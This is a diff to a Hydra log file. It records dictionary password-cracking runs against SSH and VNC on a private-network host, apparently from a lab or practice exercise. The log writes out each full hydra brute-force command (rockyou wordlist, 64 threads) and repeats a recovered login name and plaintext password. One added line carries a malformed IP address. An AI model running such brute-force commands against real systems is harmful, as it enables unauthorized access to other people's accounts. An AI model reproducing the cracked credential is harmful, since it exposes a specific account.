@@ -8,3 +8,6 @@
 [22][ssh] host: 192.168.1.80   login: thomassegale   password: Mm2021M1
 # Hydra v9.4 run at 2023-01-25 07:07:30 on 192.168.1.80 ssh (hydra -l thomassegale -P rockyou.txt -t 64 -vV -o output.txt -I ssh://192.168.1.80)
 [22][ssh] host: 192.168.1.80   login: thomassegale   password: Mm2021M1
+# Hydra v9.4 run at 2023-01-26 08:06:06 on 192.1168.1.80 vnc (hydra -P rockyou.txt -t 64 -vV -o output.txt -I vnc://192.1168.1.80)
+# Hydra v9.4 run at 2023-01-26 08:07:40 on 192.168.1.80 ssh (hydra -l thomassegale -P rockyou.txt -t 64 -vV -o output.txt -I ssh://192.168.1.80)
+[22][ssh] host: 192.168.1.80   login: thomassegale   password: Mm2021M1
